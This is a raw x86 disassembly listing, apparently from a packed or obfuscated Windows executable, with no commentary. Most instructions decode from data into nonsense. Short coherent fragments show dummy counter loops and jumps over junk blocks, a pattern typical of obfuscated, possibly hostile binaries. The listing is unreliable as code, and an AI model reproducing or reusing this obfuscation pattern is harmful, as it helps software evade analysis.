  407bf4:	scas   al,BYTE PTR es:[edi]
  407bf5:	fst    QWORD PTR [edi-0x6b675112]
  407bfb:	fild   DWORD PTR ds:0xb5d85f6d
  407c01:	and    dh,cl
  407c03:	or     al,0xef
  407c05:	add    BYTE PTR [edi],ch
  407c07:	push   es
  407c08:	popa   
  407c09:	in     eax,0x20
  407c0b:	sbb    BYTE PTR [ecx+ebx*1],bh
  407c0e:	push   cs
  407c0f:	add    edx,DWORD PTR [ebx-0x70]
  407c12:	jne    0x407c4d
  407c14:	outs   dx,BYTE PTR ds:[esi]
  407c15:	(bad)  
  407c16:	scas   al,BYTE PTR es:[edi]
  407c17:	imul   esi,esi,0x4517d0e4
  407c1d:	xor    dh,BYTE PTR [eax-0x6e3c1a07]
  407c23:	or     eax,0x140066b9
  407c28:	sub    ah,BYTE PTR [edx-0x16ab0b46]
  407c2e:	pop    esi
  407c2f:	sar    BYTE PTR [edi],0x6c
  407c32:	into   
  407c33:	mov    ah,0xf
  407c35:	xor    ax,0xcb33
  407c39:	repnz popa 
  407c3b:	fbld   TBYTE PTR [ebx-0x151acecf]
  407c41:	sbb    al,0xa5
  407c43:	jmp    0x52181c0d
  407c48:	jnp    0x407bf3
  407c4a:	test   eax,0xa0eb7be8
  407c4f:	out    0x4f,eax
  407c51:	xchg   ebp,eax
  407c52:	in     eax,dx
  407c53:	mov    esi,0x607cb171
  407c58:	pop    eax
  407c59:	scas   al,BYTE PTR es:[edi]
  407c5a:	fidivr WORD PTR [edi-0x42e13206]
  407c60:	sbb    DWORD PTR [eax],ebx
  407c62:	xchg   ebp,eax
  407c63:	iret   
  407c64:	pop    edx
  407c65:	push   edx
  407c66:	bound  ecx,QWORD PTR [edi-0x36]
  407c69:	stc    
  407c6a:	out    dx,al
  407c6b:	mov    dl,dh
  407c6d:	and    eax,DWORD PTR [ecx]
  407c6f:	fwait
  407c70:	push   ds
  407c71:	arpl   si,bx
  407c73:	dec    ebx
  407c74:	push   esp
  407c75:	add    ecx,ebp
  407c77:	adc    bh,BYTE PTR [ebp-0x56]
  407c7a:	pop    ebx
  407c7b:	mov    cl,0xc0
  407c7d:	(bad)  
  407c7e:	repnz mov esp,0xd8fe0d1d
  407c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c85:	add    ah,BYTE PTR [edx]
  407c87:	adc    DWORD PTR [esi],0x4f
  407c8a:	int    0x20
  407c8c:	push   0x61
  407c8e:	div    BYTE PTR [esi-0x5d0413b8]
  407c94:	(bad)  
  407c95:	cld    
  407c96:	mov    ebp,0x13a8453b
  407c9b:	pop    ebp
  407c9c:	pop    esp
  407c9d:	cmp    cl,BYTE PTR [edi+0x77]
  407ca0:	push   ds
  407ca1:	or     eax,0xe1c99baa
  407ca6:	lahf   
  407ca7:	stos   DWORD PTR es:[edi],eax
  407ca8:	push   edi
  407ca9:	fld    DWORD PTR [eax+0x18]
  407cac:	add    BYTE PTR [ebx-0x11fc3b22],cl
  407cb2:	inc    ebx
  407cb3:	add    eax,0x4641b4d0
  407cb8:	rcr    DWORD PTR [edx+0x1492b26a],1
  407cbe:	int3   
  407cbf:	test   DWORD PTR [ebp-0x74],edx
  407cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc3:	mov    bh,0x7d
  407cc5:	iret   
  407cc6:	or     eax,0x8dd912c8
  407ccb:	call   0x8fa4:0xb82d1f0b
  407cd2:	jbe    0x407d19
  407cd4:	adc    al,0xc4
  407cd6:	pushw  ds
  407cd8:	jbe    0x407cfa
  407cda:	enter  0x4445,0x23
  407cde:	mov    bh,0xde
  407ce0:	imul   ebp,esp,0x25
  407ce3:	mov    al,ds:0x3f1f94d7
  407ce8:	pop    edi
  407ce9:	cli    
  407cea:	sbb    BYTE PTR [esi],ch
  407cec:	loope  0x407c78
  407cee:	test   bl,al
  407cf0:	sbb    ecx,esi
  407cf2:	xchg   edx,eax
  407cf3:	pop    ebp
  407cf4:	xchg   esi,eax
  407cf5:	xchg   edx,eax
  407cf6:	fidiv  DWORD PTR [ecx+0xcda0cf8]
  407cfc:	jp     0x407d2f
  407cfe:	fsub   QWORD PTR [esi-0x4]
  407d01:	jmp    0x9f17:0xce2d1e2d
  407d08:	xchg   edx,eax
  407d09:	test   al,0xe3
  407d0b:	fs pushf 
  407d0d:	add    esp,esp
  407d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d10:	ins    BYTE PTR es:[edi],dx
  407d11:	nop
  407d12:	stos   DWORD PTR es:[edi],eax
  407d13:	adc    eax,DWORD PTR [esi-0x410b7513]
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43428e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43428e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43428e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4328ce
  407d4c:	cmp    DWORD PTR ds:0x43428e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43428e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43428e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43428e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43428e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432cce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43429a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [ecx+0x38],cl
  407da3:	sub    al,0xa1
  407da5:	dec    ebp
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0xe09dbe70
  407db0:	inc    ebx
  407db1:	pop    ds
  407db2:	fadd   QWORD PTR [edx+0x23b38020]
  407db8:	scas   al,BYTE PTR es:[edi]
  407db9:	adc    BYTE PTR [eax-0x22],0xb6
  407dbd:	mov    ah,0x29
  407dbf:	cli    
  407dc0:	jg     0x407d8e
  407dc2:	dec    eax
  407dc3:	scas   eax,DWORD PTR es:[edi]
  407dc4:	dec    ebx
  407dc5:	sbb    bh,BYTE PTR [edx]
  407dc7:	ins    DWORD PTR es:[edi],dx
  407dc8:	fist   DWORD PTR [edi-0xe8d7bb1]
  407dce:	add    dl,BYTE PTR [edi+0x7526f227]
  407dd4:	and    eax,0xa3d177ef
  407dd9:	mov    BYTE PTR [edi+edi*2],dh
  407ddc:	int3   
  407ddd:	fiadd  DWORD PTR [edi+0x39]
  407de0:	push   ds
  407de1:	push   ebx
  407de2:	jne    0x407d7a
  407de4:	je     0x407e53
  407de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407de7:	std    
  407de8:	aad    0xa
  407dea:	loop   0x407e31
  407dec:	push   ss
  407ded:	or     cx,0xe
  407df1:	nop
  407df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df3:	push   ebp
  407df4:	popf   
  407df5:	inc    edx
  407df6:	ja     0x407e13
  407df8:	push   esp
  407df9:	in     eax,dx
  407dfa:	int3   
  407dfb:	push   ebx
  407dfc:	xchg   esi,eax
  407dfd:	mov    al,ds:0x3b894077
  407e02:	mul    DWORD PTR [esi+edx*4]
  407e05:	ret    0x482a
  407e08:	push   ebp
  407e09:	inc    edx
  407e0a:	push   esp
  407e0b:	add    eax,0x72d8afe6
  407e10:	retf   0x1e9f
  407e13:	inc    ebp
  407e14:	cli    
  407e15:	hlt    
  407e16:	sbb    eax,0xe4f2e100
  407e1b:	jle    0x407dbf
  407e1d:	cwde   
  407e1e:	mov    al,ds:0xa92bdaaf
  407e23:	add    BYTE PTR [ebx-0x1b],dh
  407e26:	adc    eax,0x9b85199e
  407e2b:	pop    edi
  407e2c:	push   ds
  407e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e2e:	dec    ebx
  407e2f:	cli    
  407e30:	pop    ebp
  407e31:	out    dx,al
  407e32:	repnz fstp DWORD PTR [esi+0x6b]
  407e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e37:	or     edx,DWORD PTR [edi-0x48]
  407e3a:	jmp    0x1f0c:0x6cda4844
  407e41:	fadd   DWORD PTR [eax+0x6d]
  407e44:	in     eax,dx
  407e45:	std    
  407e46:	lock neg DWORD PTR [edi]
  407e49:	mov    ebp,esi
  407e4b:	mov    esi,0x8c61e54d
  407e50:	fnsave ds:0xbebf8845
  407e56:	dec    edx
  407e57:	neg    ebp
  407e59:	mov    ah,0xbd
  407e5b:	add    al,0x58
  407e5d:	ins    DWORD PTR es:[edi],dx
  407e5e:	popf   
  407e5f:	test   BYTE PTR [ebp+edx*1-0x80],0xe3
  407e64:	jmp    0x407e83
  407e66:	(bad)  [ebp-0x75]
  407e69:	dec    ecx
  407e6a:	pusha  
  407e6b:	retf   
  407e6c:	stos   BYTE PTR es:[edi],al
  407e6d:	scas   al,BYTE PTR es:[edi]
  407e6e:	push   0xdb9a50f4
  407e73:	cmp    dl,bl
  407e75:	call   0x5758:0x1f3c5956
  407e7c:	sub    eax,0x6fdb1401
  407e81:	sub    ebx,DWORD PTR [eax-0x6a]
  407e84:	xchg   ebp,eax
  407e85:	inc    esp
  407e86:	test   eax,0x5e8d63ce
  407e8b:	push   ss
  407e8c:	pop    ds
  407e8d:	not    BYTE PTR [edx-0x2e53273f]
  407e93:	push   eax
  407e94:	jo     0x407ebb
  407e96:	jl     0x407e62
  407e98:	test   DWORD PTR [ecx-0x2d3b2207],esi
  407e9e:	and    BYTE PTR [eax],ch
  407ea0:	ja     0x407e56
  407ea2:	cmp    eax,DWORD PTR [ecx-0x6b89a046]
  407ea8:	(bad)  
  407ea9:	hlt    
  407eaa:	jge    0x407ed7
  407eac:	outs   dx,BYTE PTR ds:[esi]
  407ead:	sub    cl,BYTE PTR [esi]
  407eaf:	inc    edi
  407eb0:	xor    BYTE PTR [esi+0x3b483fca],ah
  407eb6:	or     al,0x47
  407eb8:	inc    eax
  407eb9:	inc    ebx
  407eba:	scas   eax,DWORD PTR es:[edi]
  407ebb:	test   al,0xb4
  407ebd:	push   ss
  407ebe:	sbb    ebx,DWORD PTR [ecx]
  407ec0:	stc    
  407ec1:	pop    ss
  407ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec3:	ss mov edi,0xe266dc1f
  407ec9:	js     0x407e6f
  407ecb:	xor    dh,BYTE PTR [edi+0x1]
  407ece:	je     0x407f12
  407ed0:	into   
  407ed1:	sub    al,0x28
  407ed3:	jmp    0x2231:0x1a8a8792
  407eda:	inc    esp
  407edb:	outs   dx,BYTE PTR ds:[esi]
  407edc:	pop    ecx
  407edd:	sbb    BYTE PTR [esi-0x73],dh
  407ee0:	dec    edx
  407ee1:	imul   esp,DWORD PTR [edx],0xffffffc7
  407ee4:	sbb    al,0xe2
  407ee6:	sub    ah,BYTE PTR [ebx+0x37bddd3f]
  407eec:	cmp    eax,0xfab1646
  407ef1:	stc    
  407ef2:	(bad)  
  407ef3:	arpl   WORD PTR [esi+0x7feec0cd],sp
  407ef9:	call   0xd6a91cae
  407efe:	jl     0x407f12
  407f00:	cs std 
  407f02:	retf   0x917d
  407f05:	or     ah,bh
  407f07:	push   esi
  407f08:	mov    dh,0x40
  407f0a:	push   gs
  407f0c:	aad    0x41
  407f0e:	dec    ecx
  407f0f:	fcmovbe st,st(2)
  407f11:	xchg   esp,eax
  407f12:	sbb    al,0x8
  407f14:	(bad)  
  407f15:	mov    dl,BYTE PTR [edx+ebp*1-0x24]
  407f19:	cli    
  407f1a:	(bad)  
  407f1c:	mov    esp,0x805b5276
  407f21:	call   DWORD PTR [esi+ebx*1-0x77b2e347]
  407f28:	mov    esp,0x350b164f
  407f2d:	enter  0x59dc,0x8d
  407f31:	call   0x8ae1cef3
  407f36:	sbb    esi,DWORD PTR [ecx]
  407f38:	inc    ebp
  407f39:	(bad)  
  407f3a:	sub    BYTE PTR [esi+eiz*1],dl
  407f3d:	or     ch,ah
  407f3f:	fidiv  WORD PTR [ecx+0x1b374a5b]
  407f45:	int    0xdf
  407f47:	lea    ecx,[esi-0x37]
  407f4a:	inc    eax
  407f4b:	jno    0x407fc2
  407f4d:	not    DWORD PTR [esi]
  407f4f:	xor    eax,0xdb6f695b
  407f54:	xchg   esp,eax
  407f55:	je     0x407f3b
  407f57:	imul   esi,DWORD PTR [edx+0x6ce30f4a],0x62
  407f5e:	or     BYTE PTR [esi+0x1],ch
  407f61:	mov    DWORD PTR [edi],0x9d275a96
  407f67:	pop    edx
  407f68:	jne    0x407f22
  407f6a:	cmp    al,0xfe
  407f6c:	xchg   edi,eax
  407f6d:	mov    cl,0xdd
  407f6f:	push   edx
  407f70:	cmp    al,0xa4
  407f72:	pop    edi
  407f73:	inc    ebp
  407f74:	xor    DWORD PTR [esp+edi*1+0x1c80af48],ebx
  407f7b:	repz and BYTE PTR [eax-0x4ee0006],dl
  407f82:	sbb    BYTE PTR [eax],dh
  407f84:	mov    eax,ds:0x98b2cd73
  407f89:	jo     0x407f6d
  407f8b:	icebp  
  407f8c:	and    al,0x21
  407f8e:	pop    esp
  407f8f:	mov    ds:0x92b5e4b2,eax
  407f94:	adc    BYTE PTR ds:0x10e13f3e,dh
  407f9a:	mov    ecx,0x928ce1e9
  407f9f:	adc    al,0xb4
  407fa1:	lods   eax,DWORD PTR ds:[esi]
  407fa2:	xchg   esp,eax
  407fa3:	push   ecx
  407fa4:	je     0x409cf3
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x43427a,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432608,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43428a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43428a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43428a,edi
  407fe5:	cmp    DWORD PTR ds:0x43428a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43428a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432b3e
  40800a:	cmp    DWORD PTR ds:0x43428a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43428a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43428a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43429e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	cmp    ecx,DWORD PTR [ecx]
  408045:	sub    ebx,ebx
  408047:	inc    esi
  408048:	enter  0x7070,0x69
  40804c:	jg     0x4080be
  40804e:	jo     0x40808f
  408050:	nop
  408051:	fs push cs
  408053:	pop    es
  408054:	inc    eax
  408055:	push   edi
  408056:	xor    DWORD PTR [edx],ecx
  408058:	out    dx,al
  408059:	dec    edx
  40805a:	call   0x9cf3b738
  40805f:	mov    BYTE PTR [edi-0x1e],ch
  408062:	sbb    esi,DWORD PTR [edx]
  408064:	jae    0x408019
  408066:	add    eax,DWORD PTR [ebp+0x1e6cd953]
  40806c:	pushf  
  40806d:	(bad)  
  40806e:	cld    
  40806f:	repnz xor bl,0x7b
  408073:	jo     0x40803a
  408075:	and    ecx,DWORD PTR [edi]
  408077:	xor    eax,0x38133352
  40807c:	xchg   eax,edi
  40807e:	in     al,0x4a
  408080:	mov    ?,esi
  408082:	pusha  
  408083:	cmp    BYTE PTR [ecx-0x3e],cl
  408086:	sub    ecx,DWORD PTR [edi+0x2d]
  408089:	mov    bh,0xf
  40808b:	fdecstp 
  40808d:	inc    ebx
  40808e:	ret    0x91ad
  408091:	(bad)  
  408092:	mov    bh,0x14
  408094:	pop    ds
  408095:	jp     0x408017
  408097:	xchg   ecx,eax
  408098:	jge    0x4080c2
  40809a:	add    esi,edx
  40809c:	xor    DWORD PTR [ebx+0x58e59151],ebx
  4080a2:	rcr    BYTE PTR [ecx+0x69351afd],cl
  4080a8:	pop    edx
  4080a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080aa:	retf   0x2d47
  4080ad:	cld    
  4080ae:	fisubr WORD PTR [edi-0x70]
  4080b1:	adc    ecx,DWORD PTR [ebp+0x64f4996f]
  4080b7:	js     0x4080ad
  4080b9:	loop   0x4080e4
  4080bb:	inc    ecx
  4080bc:	sub    eax,0xa326c497
  4080c1:	js     0x40810d
  4080c3:	(bad)  
  4080c4:	fwait
  4080c5:	mov    bh,0xff
  4080c7:	xchg   ebx,eax
  4080c8:	push   ds
  4080c9:	popa   
  4080ca:	jle    0x4080ae
  4080cc:	dec    esi
  4080cd:	mov    ah,0x4a
  4080cf:	addr16 jle 0x40805f
  4080d2:	and    DWORD PTR [edi],0x32
  4080d5:	dec    esi
  4080d6:	sbb    al,0xc8
  4080d8:	adc    eax,0x867d8428
  4080dd:	jle    0x40806b
  4080df:	mov    al,ds:0xaf0f359f
  4080e4:	pop    ss
  4080e5:	add    BYTE PTR [edx+edx*2+0x24],ah
  4080e9:	cmp    al,0x20
  4080eb:	add    BYTE PTR [eax-0x7],bl
  4080ee:	xor    BYTE PTR [ecx+0x24dc77e0],dh
  4080f4:	loope  0x408120
  4080f6:	shl    DWORD PTR [eax-0x23],0x44
  4080fa:	sub    al,0xbf
  4080fc:	adc    BYTE PTR [ebx],ch
  4080fe:	mov    WORD PTR [ebx],fs
  408100:	in     eax,dx
  408101:	xor    DWORD PTR [edi+eiz*2+0x66],0xf73c3f5a
  408109:	or     ah,BYTE PTR ds:[ebp+0x3e6bdd5a]
  408110:	ret    0xcbb
  408113:	bound  esp,QWORD PTR [esi]
  408115:	popf   
  408116:	xchg   edx,eax
  408117:	std    
  408118:	cmp    al,BYTE PTR [edx]
  40811a:	push   ebx
  40811b:	dec    edx
  40811c:	stos   DWORD PTR es:[edi],eax
  40811d:	rol    edi,1
  40811f:	push   esp
  408120:	xchg   DWORD PTR [edx],esp
  408122:	inc    edx
  408123:	pop    ss
  408124:	jg     0x4080e6
  408126:	ins    BYTE PTR es:[edi],dx
  408127:	dec    esi
  408128:	dec    eax
  408129:	mov    edx,0xe9a3c61e
  40812e:	cmp    al,0x22
  408130:	cmp    DWORD PTR [ecx-0x11],ecx
  408133:	ret    
  408134:	sbb    bh,0xd
  408137:	(bad)  
  408138:	into   
  408139:	add    BYTE PTR ds:0xae681f4c,al
  40813f:	sbb    dl,BYTE PTR [esp+ecx*1+0x30]
  408143:	lods   eax,DWORD PTR ds:[esi]
  408144:	das    
  408145:	mov    eax,0x88a88c64
  40814a:	mov    cl,0x63
  40814c:	inc    esi
  40814d:	jle    0x408193
  40814f:	mov    esp,0xce665000
  408154:	and    al,0x5d
  408156:	pop    esp
  408157:	xchg   esp,eax
  408158:	adc    al,0xa1
  40815a:	aaa    
  40815b:	stos   BYTE PTR es:[edi],al
  40815c:	dec    ebp
  40815d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40815e:	(bad)  
  40815f:	and    BYTE PTR [esi+0x7a],al
  408162:	adc    ah,0x4f
  408165:	ficom  WORD PTR [edx-0x6b0ef09]
  40816b:	imul   eax,DWORD PTR [edx-0x71],0x8c971b7f
  408172:	fist   DWORD PTR [ebx]
  408174:	les    ebx,FWORD PTR [eax]
  408176:	mov    esi,0x26d4d579
  40817b:	icebp  
  40817c:	sahf   
  40817d:	mov    ebp,0x2bc442db
  408182:	adc    al,0xba
  408184:	dec    esi
  408185:	dec    eax
  408186:	sub    ch,BYTE PTR [eax+0x16]
  408189:	fs ds xchg ebp,eax
  40818c:	pop    ecx
  40818d:	pop    edi
  40818e:	push   es
  40818f:	add    eax,0xb79c0656
  408194:	mov    ds:0x97514fad,eax
  408199:	loopne 0x40813e
  40819b:	inc    edx
  40819c:	or     BYTE PTR [ebp-0x63],dl
  40819f:	fsub   QWORD PTR [edi-0x1162ad5e]
  4081a5:	cmp    cl,ah
  4081a7:	retf   
  4081a8:	cmp    eax,0xd66d51b
  4081ad:	push   esp
  4081ae:	rcr    BYTE PTR [eax-0x4b3c04d8],0x3d
  4081b5:	inc    esi
  4081b6:	mulps  xmm0,XMMWORD PTR [ecx+0xbb1c493]
  4081bd:	mov    esp,0x360a0316
  4081c2:	cmp    eax,0x1710db2f
  4081c7:	xchg   esp,eax
  4081c8:	jp     0x4081c1
  4081ca:	mov    ah,0x86
  4081cc:	fidivr DWORD PTR [edx]
  4081ce:	cs jb  0x4081e6
  4081d1:	sbb    DWORD PTR [ebx-0x1a004347],ecx
  4081d7:	ja     0x408240
  4081d9:	rcl    BYTE PTR [ecx],cl
  4081db:	xchg   ebx,eax
  4081dc:	push   edx
  4081dd:	pop    edx
  4081de:	(bad)  
  4081df:	out    0xf1,al
  4081e1:	jmp    0x2f61b01c
  4081e6:	or     al,BYTE PTR [esi-0x4a]
  4081e9:	jmp    0x4081ce
  4081eb:	pop    ecx
  4081ec:	xor    eax,0xa9d6f790
  4081f1:	mov    ds:0xc2d1c5d0,eax
  4081f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f7:	mov    esi,0x5ee2389d
  4081fc:	adc    ebx,DWORD PTR [eax+0x76]
  4081ff:	cwde   
  408200:	mov    bl,0x74
  408202:	adc    edx,DWORD PTR [esi+eiz*8+0x63]
  408206:	add    ebx,edx
  408208:	mov    al,0x5e
  40820a:	xchg   esi,eax
  40820b:	pop    ebx
  40820c:	sbb    DWORD PTR [eax+0x32],edi
  40820f:	inc    ecx
  408210:	cmc    
  408211:	push   edi
  408212:	call   0x256:0xa43ac76f
  408219:	mov    ds:0x6af38e4f,al
  40821e:	jns    0x408298
  408220:	dec    esp
  408221:	hlt    
  408222:	iret   
  408223:	sbb    DWORD PTR [esi-0x74a6640a],esi
  408229:	ins    DWORD PTR es:[edi],dx
  40822a:	jno    0x40822f
  40822c:	inc    esi
  40822d:	neg    DWORD PTR [ebp-0x6c]
  408230:	dec    ecx
  408231:	enter  0x3f0a,0xec
  408235:	pop    ds
  408236:	jb     0x408290
  408238:	inc    esp
  408239:	adc    BYTE PTR [ebp-0x5c],dl
  40823c:	mov    ebp,0xcb7bb188
  408241:	cmp    BYTE PTR [ebx+0x5c],0x38
  408245:	out    dx,eax
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432ce2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434272,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434286,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	mov    bl,0xf3
  408282:	pop    es
  408283:	in     eax,dx
  408284:	mov    edi,0x697070d6
  408289:	jg     0x4082fb
  40828b:	jo     0x408270
  40828d:	xor    dl,ch
  40828f:	neg    DWORD PTR [ecx-0x4cf1fca7]
  408295:	pop    eax
  408296:	out    0x7b,al
  408298:	dec    ebx
  408299:	ficomp DWORD PTR [ebp+0x49]
  40829c:	mov    ecx,0x93844eed
  4082a1:	fcomp  QWORD PTR [esi]
  4082a3:	xchg   edi,eax
  4082a4:	pop    DWORD PTR [esp+edx*4]
  4082a7:	jle    0x408317
  4082a9:	dec    ecx
  4082aa:	shl    DWORD PTR [eax+ecx*2+0x21],cl
  4082ae:	lods   eax,DWORD PTR ds:[esi]
  4082af:	cmc    
  4082b0:	mov    BYTE PTR [edx+0x5b6b77c1],ch
  4082b6:	dec    ebp
  4082b7:	or     edi,eax
  4082b9:	fnstsw WORD PTR [edi-0x608c0b9a]
  4082bf:	jae    0x408310
  4082c1:	stc    
  4082c2:	push   esi
  4082c3:	stos   DWORD PTR es:[edi],eax
  4082c4:	aaa    
  4082c5:	out    dx,al
  4082c6:	lods   al,BYTE PTR ds:[esi]
  4082c7:	out    dx,eax
  4082c8:	inc    eax
  4082c9:	dec    edi
  4082ca:	pop    ss
  4082cb:	xchg   esp,eax
  4082cc:	pop    ecx
  4082cd:	or     eax,0xb2b2f733
  4082d2:	mov    esi,0xd389325f
  4082d7:	push   edi
  4082d8:	xor    al,cl
  4082da:	mov    esp,0xbbd1b339
  4082df:	imul   edi,DWORD PTR [esp+ebx*4+0x4a517c67],0x20b8c194
  4082ea:	in     eax,0x85
  4082ec:	sub    eax,0xb499ac9c
  4082f1:	push   ebp
  4082f2:	xchg   esp,eax
  4082f3:	xchg   edi,eax
  4082f4:	add    DWORD PTR [edi+0x2b],esi
  4082f7:	add    bh,BYTE PTR [ebp+0x5a]
  4082fa:	ss xchg ebx,eax
  4082fc:	jbe    0x408329
  4082fe:	ret    0x665f
  408301:	outs   dx,BYTE PTR ds:[esi]
  408302:	and    DWORD PTR [edi+edx*1],ecx
  408305:	js     0x408322
  408307:	sahf   
  408308:	paddsw mm1,QWORD PTR [ebp+0x44]
  40830c:	stos   BYTE PTR es:[edi],al
  40830d:	rol    ebx,cl
  40830f:	pop    es
  408310:	sti    
  408311:	(bad)  
  408313:	fidivr WORD PTR [esi]
  408315:	enter  0xff78,0xc4
  408319:	test   DWORD PTR [edx-0x5c22f860],esi
  40831f:	imul   edi,edx,0x910d79e5
  408325:	jbe    0x40836d
  408327:	test   BYTE PTR [ebx+eiz*1-0x1b5fd98e],ah
  40832e:	aad    0x8e
  408330:	fidivr WORD PTR [edi]
  408332:	js     0x408388
  408334:	lods   al,BYTE PTR ds:[esi]
  408335:	lods   eax,DWORD PTR ds:[esi]
  408336:	add    bh,cl
  408338:	sbb    edi,DWORD PTR ds:0x1857e28b
  40833e:	nop
  40833f:	outs   dx,DWORD PTR ds:[esi]
  408340:	xchg   esp,eax
  408341:	fsubr  QWORD PTR [ecx]
  408343:	daa    
  408344:	add    bl,bl
  408346:	stc    
  408347:	xor    BYTE PTR [ebx],ch
  408349:	mov    al,ds:0xb120f498
  40834e:	out    0x36,eax
  408350:	outs   dx,BYTE PTR ds:[esi]
  408351:	in     eax,dx
  408352:	sub    eax,0xd73793a4
  408357:	push   ss
  408358:	sbb    BYTE PTR cs:[esi-0x69],0xaf
  40835d:	adc    al,0x2a
  40835f:	push   cs
  408360:	pop    ebp
  408361:	jae    0x408385
  408363:	xor    eax,0x7ccbbd33
  408368:	div    DWORD PTR [edi-0x5d983bb4]
  40836e:	mov    ds:0x6417b2c9,al
  408373:	pop    edi
  408374:	je     0x408358
  408376:	ss sti 
  408378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408379:	mov    cl,0xdd
  40837b:	mov    ecx,0x8ea1a14c
  408380:	push   edx
  408381:	into   
  408382:	not    BYTE PTR [edi+0x7c]
  408385:	iret   
  408386:	outs   dx,BYTE PTR ds:[esi]
  408387:	ret    
  408388:	mov    edx,0x40010d30
  40838d:	sbb    eax,0x9d8861be
  408392:	xchg   ecx,eax
  408393:	ret    
  408394:	lods   eax,DWORD PTR ds:[esi]
  408395:	icebp  
  408396:	xchg   ebp,esi
  408398:	int    0x73
  40839a:	repz addr16 ds jne 0x4083df
  40839f:	bnd jns 0x4083a8
  4083a2:	fwait
  4083a3:	jp     0x4083e7
  4083a5:	jle    0x408363
  4083a7:	es in  al,dx
  4083a9:	cmp    eax,0xc76308a1
  4083ae:	jle    0x4083c1
  4083b0:	push   cs
  4083b1:	push   esi
  4083b2:	shl    BYTE PTR [edx+0x73d37fa3],0x91
  4083b9:	inc    edx
  4083ba:	repz push ebx
  4083bc:	and    al,0xee
  4083be:	or     cl,dl
  4083c0:	jp     0x408386
  4083c2:	mov    BYTE PTR [edx],dl
  4083c4:	xchg   DWORD PTR [esi],ebx
  4083c6:	test   DWORD PTR [edx],0xe280b578
  4083cc:	push   edx
  4083cd:	jle    0x40836c
  4083cf:	or     eax,0xc6369c71
  4083d4:	(bad)  
  4083d5:	std    
  4083d6:	push   esp
  4083d7:	xor    al,0xf3
  4083d9:	push   0x73
  4083db:	movq   mm6,QWORD PTR [edi-0x12]
  4083df:	cli    
  4083e0:	fwait
  4083e1:	push   ss
  4083e2:	dec    edx
  4083e3:	fmul   QWORD PTR ds:0x600dc2af
  4083e9:	xor    BYTE PTR [edx+0x55],0x97
  4083ed:	mul    DWORD PTR [eax-0x2f]
  4083f0:	push   edx
  4083f1:	dec    ebx
  4083f2:	push   dx
  4083f4:	adc    eax,0xee144142
  4083f9:	adc    BYTE PTR [ebx],ch
  4083fb:	dec    esp
  4083fc:	sti    
  4083fd:	xchg   edi,eax
  4083fe:	cmp    eax,0xa18a7b94
  408403:	jb     0x408404
  408405:	or     ebx,DWORD PTR [esi+0x43]
  408408:	mov    ecx,0xf19d877b
  40840d:	int    0x4f
  40840f:	or     bh,BYTE PTR [ebp-0x25]
  408412:	jb     0x408492
  408414:	mov    esp,0x71c6726c
  408419:	aam    0x97
  40841b:	leave  
